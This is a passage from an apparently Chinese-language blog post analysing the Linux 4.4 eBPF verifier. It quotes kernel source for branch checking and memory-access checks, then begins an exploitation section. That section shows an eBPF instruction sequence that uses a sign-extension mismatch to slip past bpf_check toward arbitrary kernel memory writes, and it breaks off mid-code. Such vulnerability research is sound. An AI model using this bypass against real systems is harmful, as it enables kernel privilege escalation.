<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">				    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">					verbose(<span class="string">"BPF_JA uses reserved fields\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EINVAL;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">				<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">				    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">					verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EINVAL;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">				 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">				 * Make sure that it's readable at this time</span></span><br><span class="line"><span class="comment">				 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">				 * something into it earlier</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">					verbose(<span class="string">"R0 leaks addr as return value\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EACCES;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">				insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">				<span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					do_print_state = <span class="literal">true</span>;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>查看一下pop_stack函数，函数中先判断env-&gt;head是否为0，如果是就代表没有未检查的路径了。否则将保持的state恢复。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">	insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line">	<span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">		*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">	elem = env-&gt;head-&gt;next;</span><br><span class="line">	kfree(env-&gt;head);</span><br><span class="line">	env-&gt;head = elem;</span><br><span class="line">	env-&gt;stack_size--;</span><br><span class="line">	<span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看一下条件分支的处理代码check_cond_jmp_op，我们可以看到这个检查将跳转分成两种，第一种[1]处是JEQ和JNE，并且是比较的值是立即数的情况，此时就判断立即数是不是等于要比较的寄存器，进行直接跳转。第二种[2]处是其他情况，均需把off+1的值压入栈中作为另一条分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(struct verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">			     struct bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> = <span class="title">env</span>-&gt;<span class="title">cur_state</span>.<span class="title">regs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">other_branch</span>;</span></span><br><span class="line">	u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opcode &gt; BPF_EXIT) &#123;</span><br><span class="line">		verbose(<span class="string">"invalid BPF_JMP opcode %x\n"</span>, opcode);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">		<span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span>) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_JMP uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* check src1 operand */</span></span><br><span class="line">		err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">			verbose(<span class="string">"R%d pointer comparison prohibited\n"</span>,</span><br><span class="line">				insn-&gt;src_reg);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_JMP uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* check src2 operand */</span></span><br><span class="line">	err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line">[<span class="number">1</span>]	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">	    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">	    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">	    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">			<span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			*insn_idx += insn-&gt;off;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">			 * that's where the program will go</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]	other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line">	<span class="keyword">if</span> (!other_branch)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span></span><br><span class="line">	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">	    insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ ||</span><br><span class="line">			       opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">	    regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;</span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">			<span class="comment">/* next fallthrough insn can access memory via</span></span><br><span class="line"><span class="comment">			 * this register</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">			<span class="comment">/* branch targer cannot access it, since reg == 0 */</span></span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">		verbose(<span class="string">"R%d pointer comparison prohibited\n"</span>, insn-&gt;dst_reg);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">		   (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">			<span class="comment">/* detect if (R == imm) goto</span></span><br><span class="line"><span class="comment">			 * and in the target state recognize that R = imm</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* detect if (R != imm) goto</span></span><br><span class="line"><span class="comment">			 * and in the fall-through state recognize that R = imm</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (log_level)</span><br><span class="line">		print_verifier_state(env);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Q-amp-A2：能否进行直接的内存读写？"><a href="#Q-amp-A2：能否进行直接的内存读写？" class="headerlink" title="Q&amp;A2：能否进行直接的内存读写？"></a>Q&amp;A2：能否进行直接的内存读写？</h4><p>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STX_MEM_DW(8,7,0x0,0x0)</span><br></pre></td></tr></table></figure>
<p>接下来分析一下ST和LD有哪些限制，check_reg_arg[1]处检查寄存器是否访问寄存器的序号是否超过最大值10，如果是SRC_OP检查是否是未初始化的值。否则检查是否要写的地方是rbp，并将要写的寄存器值置为UNKOWN。然后是check_mem_access检查，该函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">			<span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check src operand */</span></span><br><span class="line">[<span class="number">1</span>]			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]			err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">			src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment">			 * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">[<span class="number">2</span>]			err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">					       BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">					       insn-&gt;dst_reg);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">				insn_idx++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment">				 * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment">				 * use reserved 'imm' field to mark this insn</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">				   (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">				    insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">				<span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment">				 * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment">				 * with different pointer types:</span></span><br><span class="line"><span class="comment">				 * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment">				 * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment">				 * Reject it.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				verbose(<span class="string">"same insn cannot be used with different pointers\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">			<span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">				err = check_xadd(env, insn);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line">				insn_idx++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check src1 operand */</span></span><br><span class="line">[<span class="number">1</span>]			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line">			<span class="comment">/* check src2 operand */</span></span><br><span class="line">[<span class="number">1</span>]			err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">			dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">[<span class="number">2</span>]			err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">					       BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">					       insn-&gt;src_reg);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">				insn-&gt;imm = dst_reg_type;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">				   (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">				    insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">				verbose(<span class="string">"same insn cannot be used with different pointers\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>以上情况，如果采用MOV这样的赋值指令去读写的话，寄存器类型会判定为IMM，而拒绝。另外一种是用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。而这种方法会在赋值时被设定为UNKNOWN而拒绝读写。</p>
<h2 id="bpf-prog-run"><a href="#bpf-prog-run" class="headerlink" title="__bpf_prog_run"></a>__bpf_prog_run</h2><p>以上就是对于加载指令的全部检查，可以看到我们能想到的内存读写方法都是会被检测出来的。真正执行的时候代码在<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c#L195" target="_blank" rel="noopener">__bpf_prog_run</a>中，其中可以看到所谓的各个寄存器和栈只是这个函数的局部变量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">	u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">	u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">		[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">		<span class="comment">/* Now overwrite non-defaults ... */</span></span><br></pre></td></tr></table></figure>
<p>程序维护了一个跳表，根据opcode来进行跳转，而函数中没有任何check，具体实现代码十分简单，就不赘述了。</p>
<p>可以发现程序的寄存器变量与check中的寄存器变量不太一样，此时是unsigned long long类型。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用整数扩展问题绕过bpf-check"><a href="#利用整数扩展问题绕过bpf-check" class="headerlink" title="利用整数扩展问题绕过bpf_check"></a>利用整数扩展问题绕过bpf_check</h2><p>本漏洞的原因是check函数和真正的函数的执行方法不一致导致的，主要问题是二者寄存器值类型不同。先看下面一段EBPF指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]: ALU_MOV_K(<span class="number">0</span>,<span class="number">9</span>,<span class="number">0x0</span>,<span class="number">0xffffffff</span>)</span><br><span class="line">[<span class="number">1</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">9</span>,<span class="number">0x2</span>,<span class="number">0xffffffff</span>)</span><br><span class="line">[<span class="number">2</span>]: ALU64_MOV_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">3</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">4</span>]: ......</span><br><span class="line">     ......</span><br></pre></td></tr></table></figure>
<p>第0条指令是将0xffffffff放入r9寄存器中，当在do_check函数中时，在[1]处会直接将0xffffffff复制给r9，并将type赋值为IMM。在第[1]条指令，比较r9==0xffffffff，相等时就执行[2]、[3]，否则跳到[4]。根据前文对退出的分析，这个地方在do_check看来是一个恒等式，不会将另外一条路径压入stack，直接退出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">		<span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;</span><br><span class="line">			err = check_alu_op(env, insn);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err；</span><br><span class="line">		&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> check_alu_op(struct verifier_env *env, struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">	struct reg_state *regs = env-&gt;cur_state.regs;</span><br><span class="line">	u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;</span><br><span class="line">		... ...</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* check src operand */</span></span><br><span class="line">		.......</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* check dest operand */</span></span><br><span class="line">		.......</span><br><span class="line"></span><br><span class="line">	